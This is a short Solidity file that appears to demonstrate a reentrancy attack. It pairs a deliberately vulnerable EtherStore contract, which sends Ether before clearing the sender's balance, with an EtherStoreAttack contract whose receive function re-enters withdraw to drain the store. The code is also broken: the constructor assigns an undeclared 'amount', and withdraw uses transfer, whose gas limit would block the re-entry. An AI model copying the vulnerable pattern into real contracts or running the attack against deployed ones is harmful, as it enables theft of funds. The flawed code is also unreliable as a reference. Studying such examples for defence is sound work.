//SPDX-License-Identifier: UNLICENSED
pragma solidity >= 0.8.2;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal; 
        bal = balances[msg.sender];
        require(bal > 0);

        payable(msg.sender).transfer(bal);
        balances[msg.sender] = 0;
    }
}

contract EtherStoreAttack {
    EtherStore public etherStore;
    uint constant AMOUNT = 1;

    constructor(address _etherStoreAddress) {
        amount = 1;
        etherStore = EtherStore(_etherStoreAddress);
    }

    // receive (or fallback) is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
             etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }
}